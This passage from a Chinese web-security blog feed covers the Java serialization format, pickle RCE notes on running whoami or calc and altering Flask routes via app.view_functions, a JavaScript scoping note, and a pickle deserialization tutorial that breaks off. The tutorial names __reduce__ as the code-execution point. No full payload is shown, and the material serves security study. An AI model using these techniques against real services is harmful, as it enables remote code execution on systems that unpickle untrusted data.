id="1-TC-ENDBLOCKDATA"><a href="#1-TC-ENDBLOCKDATA" class="headerlink" title="1. TC_ENDBLOCKDATA"></a><strong>1. TC_ENDBLOCKDATA</strong></h3><ul><li><strong>值</strong>：<code>0x78</code></li><li><strong>作用</strong>：标记块数据的结束。在读取对象数据时，如果遇到 <code>TC_ENDBLOCKDATA</code>，表示当前块数据或对象的结束。</li></ul><h3 id="2-TC-PROXYCLASSDESC"><a href="#2-TC-PROXYCLASSDESC" class="headerlink" title="2. TC_PROXYCLASSDESC"></a><strong>2. TC_PROXYCLASSDESC</strong></h3><ul><li><strong>值</strong>：<code>0x7D</code></li><li><strong>作用</strong>：表示一个代理类描述符，用于序列化实现了 <code>java.lang.reflect.Proxy</code> 的动态代理类。</li></ul><hr><h2 id="九、序列化类描述符（ClassDesc）"><a href="#九、序列化类描述符（ClassDesc）" class="headerlink" title="九、序列化类描述符（ClassDesc）"></a>九、序列化类描述符（ClassDesc）</h2><p>在序列化对象时，需要先序列化其类描述符，包含以下信息：</p><ol><li><strong>类名（className）</strong>：以 UTF-8 编码的完全限定类名。</li><li><strong>序列化版本 UID（serialVersionUID）</strong>：用于版本控制的长整型值。</li><li><strong>类描述符信息（classDescInfo）</strong>：<ul><li><strong>类标志（classFlags）</strong>：指示类的序列化特性，如是否有 <code>writeObject</code> 方法。</li><li><strong>字段描述符（fieldDesc[]）</strong>：类的字段信息。</li><li><strong>方法数据</strong>：可选，包括 <code>writeObject</code> 和 <code>readObject</code> 方法的数据。</li></ul></li></ol><hr><h2 id="十、反序列化时的注意事项"><a href="#十、反序列化时的注意事项" class="headerlink" title="十、反序列化时的注意事项"></a>十、反序列化时的注意事项</h2><ol><li><p><strong>句柄引用</strong>：在反序列化过程中，需要维护对象句柄表，以正确处理对象引用和共享。</p></li><li><p><strong>类的加载</strong>：反序列化时，JVM 会尝试加载对应的类。如果类不存在，或版本不匹配，可能会导致异常。</p></li><li><p><strong>安全风险</strong>：反序列化不可信数据可能导致安全漏洞，如反序列化漏洞。因此，反序列化时应确保数据的可信性。</p></li></ol><hr><h2 id="十二、参考资料"><a href="#十二、参考资料" class="headerlink" title="十二、参考资料"></a>十二、参考资料</h2><ul><li>官方文档：<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html">Java 序列化规范</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pickle RCE 注意事项</title>
      <link href="/2024/02/26/pickle_rce%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
      <url>/2024/02/26/pickle_rce%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="python命令执行的环境变量"><a href="#python命令执行的环境变量" class="headerlink" title="python命令执行的环境变量"></a>python命令执行的环境变量</h1><p><strong>内部命令与外部命令的区别</strong>：</p><ul><li><strong>内部命令</strong>：如 <code>dir</code>、<code>cd</code>、<code>echo</code> 等，这些命令是由 <code>cmd.exe</code>（Windows命令行解释器）直接处理的，而不需要调用独立的可执行文件。这意味着这些命令在任何时候都可以被识别和执行，而无需指定路径。</li><li><strong>外部命令</strong>：如 <code>whoami</code>、<code>calc</code>，它们是独立的可执行文件，存储在 <code>C:\Windows\System32</code> 或其他目录中。为了执行这些命令，系统需要能够找到它们所在的位置。如果当前环境没有正确设置系统的 PATH 环境变量，外部命令就可能需要绝对路径来执行。</li></ul><p><strong>命令执行方式</strong>： 当你通过 <code>os.popen</code> 或 <code>subprocess.run</code> 调用命令时，系统会依赖于当前环境来查找命令的位置：</p><ul><li><strong>内部命令</strong>：<code>cmd.exe</code> 解释器会自动处理这些命令，所以你可以直接运行 <code>dir</code>，不需要指定路径。</li><li><strong>外部命令</strong>：这些命令需要被操作系统查找。通常操作系统通过 PATH 环境变量查找命令的位置。如果 PATH 设置不完整或 Python 的运行环境没有正确继承 PATH 变量，则必须使用绝对路径。</li></ul><blockquote><p>C:\Windows\System32\calc.exe</p><p>C:\Windows\System32\whoami.exe</p></blockquote><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p>不允许动态添加路由，只能用app.view_functions[‘’]来修改路由</p><p>详情见payload.py</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>let、const和var</title>
      <link href="/2024/02/26/let%E5%92%8Cconst%E5%92%8Cvar/"/>
      <url>/2024/02/26/let%E5%92%8Cconst%E5%92%8Cvar/</url>
      
        <content type="html"><![CDATA[<h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><pre><code class="js">let x; //正确用法let y = 5;y = 6; //正确用法</code></pre><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><pre><code class="js">const x; //用法错误，const必须在声明时定义  const x = 4; //用法正确const y = 5;y = 6; //错误用法const numbers = [1, 2, 3];numbers.push(4); // 正确numbers = [1, 2, 3, 4]; // 抛出错误const foo = new Foo(&#39;rob&#39;); //正确foo.say_name(); // 正确foo = new Foo2(); // 抛出错误</code></pre><h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2><p>前两个都是块级作用域，var则是全局作用域，容易混淆。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2024/02/26/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/02/26/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h1><ul><li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li><li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li><li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li><li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li></ul><h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><p>使用 <code>pickle</code> 序列化时，可以处理以下对象：</p><ul><li><p><strong>基本类型</strong>: <code>None</code>、<code>True</code>、<code>False</code>、整数、浮点数、复数</p></li><li><p><strong>字符串和字节数据</strong>: <code>str</code>、<code>bytes</code>、<code>bytearray</code></p></li><li><p><strong>集合类型</strong>: 只包含可封存对象的 <code>tuple</code>、<code>list</code>、<code>set</code> 和 <code>dict</code></p></li><li><p>函数和类</p><p>定义在模块最外层的函数和类</p><ul><li>例如，通过 <code>def</code> 定义的函数和通过 <code>class</code> 定义的类，可以通过 <code>pickle</code> 序列化和反序列化。</li><li>但匿名函数（<code>lambda</code>）不支持，因为它们不能被引用为独立的模块属性。</li></ul></li><li><p>自定义类的实例</p><ul><li>只要类对象定义在模块的全局作用域上，并且其属性（例如 <code>__dict__</code>）也可序列化，<code>pickle</code> 就能处理这些实例。</li><li>另外，类还可以通过实现 <code>__getstate__</code> 和 <code>__setstate__</code> 方法，来自定义序列化和反序列化行为。</li></ul></li></ul><h2 id="关于模块"><a href="#关于模块" class="headerlink" title="关于模块"></a>关于模块</h2><p>在Python中，<strong>模块（module）</strong> 是一个包含Python代码的文件，其扩展名通常为<code>.py</code>。每个模块都定义了一个命名空间，里面可以包含变量、函数、类等。模块可以通过<code>import</code>语句引入到其他Python代码中，以便使用其中定义的内容。</p><p>在模块的全局作用域中定义的函数（通过 <code>def</code>）和类（通过 <code>class</code>）是可以被 <code>pickle</code> 序列化和反序列化的。</p><p>当 <code>pickle</code> 反序列化一个对象时，它依赖于该对象的<strong>全限定名</strong>（fully qualified name），也就是模块名+函数名或类名。这样，<code>pickle</code> 在反序列化时，能通过模块名找到函数或类的定义。</p><h2 id="object-reduce-self-函数"><a href="#object-reduce-self-函数" class="headerlink" title="object.__reduce__(self) 函数"></a><code>object.__reduce__(self)</code> 函数</h2><p>在开发自定义类时，可以通过重写 <code>object.__reduce__()</code> 方法来自定义序列化行为。</p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p> object.<em>_reduce</em>_()返回一个元组 (callable, (args, …), state)pikle在反序列化时会根据这个元组来重建对象：</p><ul><li><p><code>callable</code> 是一个可调用对象（通常是构造函数），用于创建新实例。</p></li><li><p><code>(args, ...)</code> 是传递给 <code>callable</code> 的参数。注意，必须是<strong>元组</strong></p></li><li><p><code>state</code> 是额外的信息（可选），用于恢复对象的内部状态。可以是列表或者字典。</p></li><li><p>例如，当对象被反序列化时，会先调用 <code>callable(*args)</code> 生成对象实例，然后根据 <code>state</code> 进一步调整对象状态。</p></li></ul><blockquote><p>注意这里就是rce的点了，可调用对象有很多。</p></blockquote><h2 id="reduce-ex-self-protocol"><a href="#reduce-ex-self-protocol" class="headerlink" title="__reduce_ex__(self, protocol)"></a>__reduce_ex__(self, protocol)</h2><p><strong>功能</strong>：这是 <code>__reduce__()</code> 的一个更通用的版本，支持传入 <code>protocol</code> 参数。<code>protocol</code> 表示序列化时使用的 pickle 协议版本。</p><p><strong>何时使用</strong>：当你希望根据不同的 <code>pickle</code> 协议版本调整序列化行为时，可以使用 <code>__reduce_ex__()</code> 方法。<code>pickle</code> 模块会优先调用 <code>__reduce_ex__()</code>，如果未定义这个方法，才会调用 <code>__reduce__()</code>。</p><blockquote><p>注意他会优先调用</p></blockquote><h2 id="getstate-self"><a href="#getstate-self" class="headerlink" title="__getstate__(self)"></a>__getstate__(self)</h2><p><strong>功能</strong>：这个方法用于返回对象的内部状态，<code>pickle</code> 在序列化对象时会调用它。通常返回的状态是一个可序列化的对象，比如字典、列表、元组等，表示对象的内部数据。</p><blockquote><p>有点像__wake_up()</p></blockquote><p><strong>何时使用</strong>：当你想要控制对象序列化时的状态，可以使用 <code>__getstate__()</code> 方法。你可以选择性地排除不需要序列化的属性或者动态计算需要序列化的状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">&quot;secret_value&quot;</span>  <span class="comment"># 不想被序列化的属性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回对象的状态，去掉了 secret</span></span><br><span class="line">        state = <span class="variable language_">self</span>.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> state[<span class="string">&#x27;secret&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> state</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="object-setstate-self"><a href="#object-setstate-self" class="headerlink" title="object._setstate_(self)"></a>object.<em>_setstate</em>_(self)</h2><p>在反序列化后自动调用，用于恢复对象的额外状态。</p><p><strong>功能</strong>：当对象被反序列化时，<code>pickle</code> 会调用 <code>__setstate__()</code>，并将 <code>state</code> 作为参数传递进来。这个 <code>state</code> 通常是由 <code>__getstate__()</code> 返回的状态。</p><p><strong>何时使用</strong>：如果你想要自定义对象在反序列化时的重建过程，或者需要重新设置某些属性，可以使用 <code>__setstate__()</code> 方法。</p><blockquote><p>destruct() XD</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="comment"># 自定义反序列化时的行为，恢复对象状态</span></span><br><span class="line">        <span class="variable language_">self</span>.__dict__.update(state)</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">&quot;restored_secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>__setstate__()</code> 方法在对象反序列化时恢复对象状态，并重新赋值 <code>secret</code>。</p><h2 id="getnewargs-self"><a href="#getnewargs-self" class="headerlink" title="__getnewargs__(self)"></a>__getnewargs__(self)</h2><p><strong>功能</strong>：这个方法允许你为对象的反序列化返回一个用于 <code>__new__()</code> 的参数元组。它控制对象在反序列化时，传递给 <code>__new__()</code> 方法的参数。</p><p><strong>何时使用</strong>：如果你的类需要通过 <code>__new__()</code> 来创建对象，并且这个对象初始化时需要特定的参数（而不仅仅是 <code>__init__()</code>），你可以使用 <code>__getnewargs__()</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回的参数将被传递给 __new__</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.value,)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="getnewargs-ex-self"><a href="#getnewargs-ex-self" class="headerlink" title="__getnewargs_ex__(self)"></a>__getnewargs_ex__(self)</h2><ul><li><strong>功能</strong>：类似于 <code>__getnewargs__()</code>，但它可以返回一个包含位置参数和关键字参数的元组，分别传递给 <code>__new__()</code> 方法。</li><li><strong>何时使用</strong>：当你希望在对象反序列化时，既能传递位置参数，又能传递关键字参数时，使用 <code>__getnewargs_ex__()</code> 方法。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs_ex__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回用于 __new__ 的位置参数和关键字参数</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.value,), &#123;<span class="string">&#x27;name&#x27;</span>: <span class="variable language_">self</span>.name&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="new-cls-args-kwargs"><a href="#new-cls-args-kwargs" class="headerlink" title="__new__(cls, *args, **kwargs)"></a>__new__(cls, *args, **kwargs)</h2><p><strong>功能</strong>：<code>__new__()</code> 是用于创建类实例的构造器方法，它在对象创建时会被首先调用。<code>pickle</code> 在反序列化时有时会调用 <code>__new__()</code> 来创建新的对象，而不是通过 <code>__init__()</code>。</p><p><strong>何时使用</strong>：当类的实例需要自定义的创建行为时，<code>__new__()</code> 非常有用，特别是当对象需要被反序列化时，必须通过特殊的方式创建。</p><p><code>__new__()</code> 是用来<strong>创建对象</strong>的静态方法，它在对象初始化之前被调用。<code>__new__()</code> 方法负责分配内存，并返回一个新的对象实例。在 Python 中，<code>__new__()</code> 通常只用于不可变对象（如 <code>int</code>、<code>str</code>、<code>tuple</code>），因为这些对象在创建后不能被修改，必须通过 <code>__new__()</code> 返回新的实例。</p><p>详解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># 创建并返回一个新对象</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="comment"># 初始化对象的属性</span></span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="详解-new"><a href="#详解-new" class="headerlink" title="详解__new__()"></a>详解__new__()</h2><p>首先明确一点：</p><p>在 Python 中，类的实例化分为两步：<strong>创建对象</strong> 和 <strong>初始化对象</strong>。<code>__new__()</code> 和 <code>__init__()</code> 分别负责这两部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># 创建并返回一个新对象</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="comment"># 初始化对象的属性</span></span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例子一目了然</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, x, y</span>):</span><br><span class="line">        <span class="comment"># 创建一个新的实例，并设置属性</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="comment"># 使用 __new__ 设置属性，确保不可变性</span></span><br><span class="line">        instance._x = x</span><br><span class="line">        instance._y = y</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="comment"># 因为属性已经在 __new__ 中设置，所以这里不需要做任何事情</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._x</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">y</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回传递给 __new__ 的参数，以便反序列化时重建对象</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._x, <span class="variable language_">self</span>._y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个 Point 对象</span></span><br><span class="line">point = Point(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 pickle 序列化和反序列化 Point 对象</span></span><br><span class="line">serialized_point = pickle.dumps(point)</span><br><span class="line">deserialized_point = pickle.loads(serialized_point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查反序列化后的对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Point: (<span class="subst">&#123;deserialized_point.x&#125;</span>, <span class="subst">&#123;deserialized_point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在 <code>__new__()</code> 方法中创建了 <code>Point</code> 对象，并设置了 <code>_x</code> 和 <code>_y</code> 属性。这样，<code>__init__()</code> 就不会修改这些属性，确保对象是不可变的（虽然在 Python 中的严格不可变性需要更多的措施，比如通过 <code>__slots__</code> 限制修改，但此处已展示核心思想）。</p><blockquote><p>虽然定义了 <code>__init__()</code>，但它没有实际做任何操作，因为对象的属性已经在 <code>__new__()</code> 中设置好了。这样可以避免初始化时再次修改属性。</p></blockquote><p>**<code>__getnewargs__()</code>**：</p><ul><li><code>__getnewargs__()</code> 返回一个包含 <code>_x</code> 和 <code>_y</code> 的元组，表示反序列化时，应该将这些参数传递给 <code>__new__()</code>，以便重新创建对象。</li><li>这个方法在 <code>pickle</code> 反序列化时被调用，用于确保 <code>__new__()</code> 能够接收到正确的参数并重建对象。</li></ul><p>对象在正常使用过程中是不可变的，但通过特殊的机制（如 <code>pickle</code> 的反序列化），对象的内部状态可以被“重新构建”或“重设”。这是因为 <code>pickle</code> 在反序列化时调用了 <code>__new__()</code> 和 <code>__getnewargs__()</code> 等特殊方法，允许对象被重新创建。</p><p>改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, x, y</span>):</span><br><span class="line">        <span class="comment"># 创建一个新的实例，并设置属性</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        instance._x = x</span><br><span class="line">        instance._y = y</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 属性已经在 __new__ 中设置，所以这里不做任何操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._x</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">y</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回传递给 __new__ 的参数，pickle 在反序列化时会调用它</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._x, <span class="variable language_">self</span>._y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个 Point 对象</span></span><br><span class="line">point = Point(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original Point: (<span class="subst">&#123;point.x&#125;</span>, <span class="subst">&#123;point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 pickle 序列化 Point 对象</span></span><br><span class="line">serialized_point = pickle.dumps(point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Point 反序列化</span></span><br><span class="line">deserialized_point = pickle.loads(serialized_point)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Deserialized Point: (<span class="subst">&#123;deserialized_point.x&#125;</span>, <span class="subst">&#123;deserialized_point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义修改后的类，通过 __getnewargs__ 修改反序列化时的属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ModifiedPoint</span>(<span class="title class_ inherited__">Point</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 在反序列化时返回不同的参数以修改属性</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化 ModifiedPoint 对象并反序列化，确保在序列化和反序列化时使用 ModifiedPoint 类</span></span><br><span class="line">modified_point = ModifiedPoint(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">serialized_modified_point = pickle.dumps(modified_point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化 ModifiedPoint 对象</span></span><br><span class="line">deserialized_modified_point = pickle.loads(serialized_modified_point)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Modified Point: (<span class="subst">&#123;deserialized_modified_point.x&#125;</span>, <span class="subst">&#123;deserialized_modified_point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关键：</p><blockquote><p><strong>不可变对象设计</strong>：通过 <code>__new__()</code> 和属性封装的方式，创建了一个在常规使用中不可修改属性的对象。</p><p><strong>反序列化的特殊性</strong>：<code>pickle</code> 通过 <code>__getnewargs__()</code> 等特殊方法，可以在反序列化时给对象不同的初始参数，允许重新设置对象的属性。尽管对象被设计为不可变，但通过 <code>pickle</code> 序列化和反序列化，我们仍然可以创建带有不同状态的对象。</p></blockquote><blockquote><p>覆盖哦</p></blockquote><blockquote><p>这里已经核心操作了</p><p>ModifiedPoint(Point)</p></blockquote><h4 id="pickle-的-R-操作码"><a href="#pickle-的-R-操作码" class="headerlink" title="pickle 的 R 操作码"></a><code>pickle</code> 的 <code>R</code> 操作码</h4><ul><li>在 <code>pickle</code> 的 opcode 中，<code>R</code> 与 <code>object.__reduce__()</code> 紧密关联。<code>R</code> 操作码在反序列化时会从栈中取出两个值，第一个作为要调用的函数，第二个是传递给函数的参数元组，然后调用该函数，返回值作为反序列化后的对象。</li><li><code>R</code> 操作符的存在允许我们手动指定一些反序列化行为，使得 <code>pickle</code> 可以解析一些由 <code>object.__reduce__()</code> 生成的复杂对象。</li></ul><h1 id="pickle过程详细解读"><a 